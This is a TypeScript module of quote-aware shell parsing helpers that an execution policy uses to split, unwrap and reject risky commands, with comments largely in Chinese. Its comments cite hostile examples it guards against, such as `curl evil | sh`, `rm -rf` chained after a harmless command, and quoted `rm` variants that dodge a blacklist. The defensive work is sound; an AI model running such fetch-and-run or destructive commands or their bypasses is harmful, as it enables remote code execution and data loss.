/**
 * Quote-aware shell syntax helpers shared by exec-policy and file-policy.
 * Pure string functions, no imports — keeps both policies on one tokeniser.
 */

// ── 环境变量前缀剥离──────────────

/**
 * 剥离命令前面的 `KEY=value` 环境变量前缀。
 * 例如 `FOO=bar BAZ=1 curl http://...` → `curl http://...`
 *
 * 只剥离安全的 key=value 对，不剥离含特殊字符的值（可能是注入）。
 */
function tryStripOneEnvAssignment(command: string): { rest: string; stripped: boolean } {
  const trimmed = command.trimStart();
  const keyMatch = trimmed.match(/^([A-Za-z_][A-Za-z0-9_]*)=/);
  if (!keyMatch) return { rest: command, stripped: false };
  let i = keyMatch[0].length;
  const ch = trimmed[i];
  if (ch === "'") {
    const end = trimmed.indexOf("'", i + 1);
    if (end === -1) return { rest: command, stripped: false };
    i = end + 1;
  } else if (ch === '"') {
    const end = trimmed.indexOf('"', i + 1);
    if (end === -1) return { rest: command, stripped: false };
    i = end + 1;
  } else {
    while (i < trimmed.length && !/[\s;|&]/.test(trimmed[i])) i++;
  }
  while (i < trimmed.length && /\s/.test(trimmed[i])) i++;
  return { rest: trimmed.slice(i), stripped: true };
}

export function stripEnvVarPrefix(command: string): string {
  let rest = command;
  for (let n = 0; n < 32; n++) {
    const next = tryStripOneEnvAssignment(rest);
    if (!next.stripped) break;
    rest = next.rest;
  }
  return rest.trim();
}

// ── Safe wrapper 剥离──────────────

/**
 * Safe wrapper 命令列表 — 这些命令本身是安全的"包装器"，
 * 真正需要检查的是它们后面的实际命令。
 */
const SAFE_WRAPPERS: ReadonlySet<string> = new Set([
  'timeout', 'time', 'nice', 'nohup', 'ionice', 'stdbuf', 'unbuffer',
]);

/**
 * 剥离命令前面的 safe wrapper（如 `timeout 10`、`nice -n 5`）。
 * 只剥离 wrapper + 它的标志/参数（数字、-flag 形式），直到遇到实际命令。
 */
export function stripSafeWrappers(command: string): string {
  let remaining = command.trim();
  let changed = true;
  // 防止无限循环，最多剥离 5 层
  let maxIter = 5;
  while (changed && maxIter-- > 0) {
    changed = false;
    const tokens = remaining.split(/\s+/);
    if (tokens.length < 2) break;
    if (SAFE_WRAPPERS.has(tokens[0])) {
      // 跳过 wrapper 本身和它的参数（-flag 或纯数字/duration）
      let i = 1;
      while (i < tokens.length && /^(-[A-Za-z0-9]|[0-9]+[smhd]?$)/.test(tokens[i])) {
        i++;
      }
      if (i < tokens.length) {
        remaining = tokens.slice(i).join(' ');
        changed = true;
      }
    }
  }
  return remaining;
}

// ── 复合命令拆分──────────────

/**
 * 将复合命令按 `&&`, `||`, `;` 与后台 `&` 拆分为独立子命令。
 * 管道 `|` 不在此拆分 — 由 checkExecPolicy 再用 splitPipeSegments 逐段检查。
 *
 * 引号/转义感知：单引号内为字面量；双引号与裸文本内 `\` 转义下一个字符；
 * 引号内的分隔符不拆分（`echo "a && b"` 是单命令）。
 * 引号未闭合时 fail-closed：整条按单命令返回（不拆分），
 * 避免把藏在残缺引号后的危险段漏检。
 *
 * 注意：不处理换行、subshell `$(...)` 和反引号 — 这些语法超出策略理解范围，
 * 由 checkExecPolicy 在非 full 模式下直接 fail-closed 拒绝（见 findUnsafeShellSyntax）。
 */
export function splitCompoundCommand(command: string): string[] {
  const parts: string[] = [];
  let current = '';
  let quote: 'single' | 'double' | null = null;
  let escaped = false;
  let i = 0;
  while (i < command.length) {
    const ch = command[i]!;
    if (escaped) {
      current += ch;
      escaped = false;
      i++;
      continue;
    }
    // 单引号内没有转义；双引号/裸文本内 \ 转义下一字符
    if (ch === '\\' && quote !== 'single') {
      current += ch;
      escaped = true;
      i++;
      continue;
    }
    if (quote === 'single') {
      if (ch === "'") quote = null;
      current += ch;
      i++;
      continue;
    }
    if (quote === 'double') {
      if (ch === '"') quote = null;
      current += ch;
      i++;
      continue;
    }
    if (ch === "'") {
      quote = 'single';
      current += ch;
      i++;
      continue;
    }
    if (ch === '"') {
      quote = 'double';
      current += ch;
      i++;
      continue;
    }
    // A lone `&` backgrounds the command and starts a new one; `>&`, `<&` and `&>` are redirections.
    const isBackground = ch === '&' && command[i + 1] !== '&' && command[i + 1] !== '>'
      && command[i - 1] !== '>' && command[i - 1] !== '<';
    if (command.startsWith('&&', i) || command.startsWith('||', i) || ch === ';' || isBackground) {
      const trimmed = current.trim();
      if (trimmed) parts.push(trimmed);
      current = '';
      if (command.startsWith('&&', i)) i += 2;
      else if (command.startsWith('||', i)) i += 2;
      else i += 1;
      while (i < command.length && /\s/.test(command[i])) i++;
      continue;
    }
    current += ch;
    i++;
  }
  if (quote !== null || escaped) return [command];
  const tail = current.trim();
  if (tail) parts.push(tail);
  return parts;
}

/**
 * 将命令按管道 `|` 拆分为独立段（`||` 不拆）。
 * 引号/转义感知规则与 splitCompoundCommand 一致；引号未闭合时 fail-closed 返回整条。
 *
 * 用于逐段过白名单 — 防止 `cat x | rm -rf y`、`curl evil | sh`
 * 这类以首命令命中白名单/只读预设的绕过。
 */
export function splitPipeSegments(command: string): string[] {
  const parts: string[] = [];
  let current = '';
  let quote: 'single' | 'double' | null = null;
  let escaped = false;
  let i = 0;
  while (i < command.length) {
    const ch = command[i]!;
    if (escaped) {
      current += ch;
      escaped = false;
      i++;
      continue;
    }
    if (ch === '\\' && quote !== 'single') {
      current += ch;
      escaped = true;
      i++;
      continue;
    }
    if (quote === 'single') {
      if (ch === "'") quote = null;
      current += ch;
      i++;
      continue;
    }
    if (quote === 'double') {
      if (ch === '"') quote = null;
      current += ch;
      i++;
      continue;
    }
    if (ch === "'") {
      quote = 'single';
      current += ch;
      i++;
      continue;
    }
    if (ch === '"') {
      quote = 'double';
      current += ch;
      i++;
      continue;
    }
    if (ch === '|' && command[i + 1] !== '|' && command[i - 1] !== '|') {
      const trimmed = current.trim();
      if (trimmed) parts.push(trimmed);
      current = '';
      i++;
      while (i < command.length && /\s/.test(command[i])) i++;
      continue;
    }
    current += ch;
    i++;
  }
  if (quote !== null || escaped) return [command];
  const tail = current.trim();
  if (tail) parts.push(tail);
  return parts;
}

/**
 * 检测超出策略理解范围的 shell 语法，返回拒绝原因（安全则返回 undefined）。
 *
 * fail-closed 场景：
 *  - 未加引号的换行 — `\n` 是命令分隔符，朴素分词会把 `cat a.txt\nrm -rf x` 整条当 cat
 *  - 命令替换 `$(...)` 与反引号 — 可在任意参数位置藏入任意命令
 *  - 进程替换 `<(...)` / `>(...)` — 同上
 *
 * 单引号内为字面量，不判定；双引号内 `$(...)` / 反引号在 bash 中仍会展开，照样拒绝。
 */
export function findUnsafeShellSyntax(command: string): string | undefined {
  let quote: 'single' | 'double' | null = null;
  let escaped = false;
  for (let i = 0; i < command.length; i++) {
    const ch = command[i]!;
    if (escaped) {
      escaped = false;
      continue;
    }
    if (ch === '\\' && quote !== 'single') {
      escaped = true;
      continue;
    }
    if (quote === 'single') {
      if (ch === "'") quote = null;
      continue;
    }
    if (ch === "'") {
      quote = 'single';
      continue;
    }
    if (quote === 'double') {
      if (ch === '"') quote = null;
      // 双引号内换行是字面量；`$(` 与反引号仍会展开，落到下方统一判定
    } else {
      if (ch === '"') {
        quote = 'double';
        continue;
      }
      // 裸文本中的换行是命令分隔符 — 策略无法逐行理解，fail-closed
      if (ch === '\n' || ch === '\r') {
        return '拒绝执行含换行的命令 — 换行可夹带额外命令，超出安全策略的理解范围。请拆分为单条命令逐次执行。';
      }
    }
    if (ch === '`') {
      return '拒绝执行含反引号命令替换的命令 — 该语法可嵌入任意命令，超出安全策略的理解范围。';
    }
    if (ch === '$' && command[i + 1] === '(') {
      return '拒绝执行含 $(...) 命令替换的命令 — 该语法可嵌入任意命令，超出安全策略的理解范围。';
    }
    // Process substitution runs an arbitrary command; it is literal inside double quotes.
    if (quote === null && (ch === '<' || ch === '>') && command[i + 1] === '(') {
      return '拒绝执行含进程替换 <(...) / >(...) 的命令 — 该语法可嵌入任意命令，超出安全策略的理解范围。';
    }
  }
  return undefined;
}

/**
 * 从命令字符串中提取实际的可执行程序名。
 * 先剥离环境变量前缀和 safe wrapper，再对首 token 去引号/转义，
 * 防止 `"rm"`、`'rm'`、`r\m` 这类引号变体绕过黑名单精确匹配。
 */
export function extractCommandName(command: string): string {
  const stripped = stripSafeWrappers(stripEnvVarPrefix(command));
  // 取第一个非管道 token
  const name = stripped.split(/[\s|]/)[0] || '';
  return unquoteToken(name);
}

/** 去除 token 外层的引号与转义（POSIX 风格：单引号字面、双引号内 \\ 仅转义 " \ $ `）。 */
function unquoteToken(token: string): string {
  let out = '';
  let quote: 'single' | 'double' | null = null;
  for (let i = 0; i < token.length; i++) {
    const ch = token[i]!;
    if (quote === 'single') {
      if (ch === "'") quote = null;
      else out += ch;
      continue;
    }
    if (quote === 'double') {
      if (ch === '"') quote = null;
      else if (ch === '\\' && i + 1 < token.length && '"\\$`'.includes(token[i + 1]!)) out += token[++i];
      else out += ch;
      continue;
    }
    if (ch === "'") {
      quote = 'single';
      continue;
    }
    if (ch === '"') {
      quote = 'double';
      continue;
    }
    if (ch === '\\' && i + 1 < token.length) {
      out += token[++i];
      continue;
    }
    out += ch;
  }
  return out;
}

// ── Segment scanning (redirections / words) ─────────────────────────

export interface ShellSegmentScan {
  /** Unquoted words of the segment, redirections removed. */
  words: string[];
  /** Raw (still quoted) form of each word, same order as `words`. */
  rawWords: string[];
  /** Targets of unquoted output redirections; fd duplications are reported as `&N`. */
  outputRedirects: string[];
  /** Unquoted `&` that is not part of a redirection. */
  hasBackground: boolean;
  /** Unquoted `<(` or `>(`. */
  hasProcessSubstitution: boolean;
  /** False when a quote or trailing backslash is left open. */
  balanced: boolean;
}

/**
 * Scan one simple command (no `;`/`&&`/`|` separators expected) into words and redirections.
 * Quote rules match splitCompoundCommand: single quotes are literal, `\` escapes elsewhere.
 */
export function scanShellSegment(segment: string): ShellSegmentScan {
  const scan: ShellSegmentScan = {
    words: [], rawWords: [], outputRedirects: [],
    hasBackground: false, hasProcessSubstitution: false, balanced: true,
  };
  let i = 0;
  const n = segment.length;
  const skipSpace = () => { while (i < n && /\s/.test(segment[i]!)) i++; };
  const isWordEnd = (ch: string) => /\s/.test(ch) || ch === '>' || ch === '<' || ch === '&';
  const readWord = (): string | undefined => {
    const start = i;
    while (i < n) {
      const ch = segment[i]!;
      if (ch === '\\') {
        if (i + 1 >= n) { scan.balanced = false; i = n; break; }
        i += 2;
        continue;
      }
      if (ch === "'" || ch === '"') {
        i++;
        while (i < n && segment[i] !== ch) {
          if (ch === '"' && segment[i] === '\\') i++;
          i++;
        }
        if (i >= n) { scan.balanced = false; break; }
        i++;
        continue;
      }
      if (isWordEnd(ch)) break;
      i++;
    }
    return i > start ? segment.slice(start, i) : undefined;
  };
  const pushWord = (raw: string) => {
    scan.rawWords.push(raw);
    scan.words.push(unquoteToken(raw));
  };

  while (i < n) {
    skipSpace();
    if (i >= n) break;
    const ch = segment[i]!;
    if (ch === '>' || (ch === '&' && segment[i + 1] === '>')) {
      if (ch === '>' && segment[i + 1] === '(') { scan.hasProcessSubstitution = true; i += 2; continue; }
      // `&>word` always writes a file; only `>&N` duplicates a descriptor.
      let dup = false;
      if (ch === '&') i++;
      i++; // '>'
      if (segment[i] === '>' || segment[i] === '|') i++;
      if (segment[i] === '&') { dup = true; i++; }
      skipSpace();
      const target = readWord();
      const value = target === undefined ? '' : unquoteToken(target);
      scan.outputRedirects.push(dup && /^(\d+|-)$/.test(value) ? `&${value}` : value);
      continue;
    }
    if (ch === '<') {
      if (segment[i + 1] === '(') { scan.hasProcessSubstitution = true; i += 2; continue; }
      while (segment[i] === '<') i++;
      if (segment[i] === '&') i++;
      skipSpace();
      readWord(); // input source / here-string body: not a command word
      continue;
    }
    if (ch === '&') {
      scan.hasBackground = true;
      i++;
      continue;
    }
    const raw = readWord();
    if (raw === undefined) { i++; continue; }
    // `2>file`: the fd number belongs to the redirection, not to the words.
    if (/^\d+$/.test(raw) && (segment[i] === '>' || segment[i] === '<')) continue;
    pushWord(raw);
  }
  return scan;
}
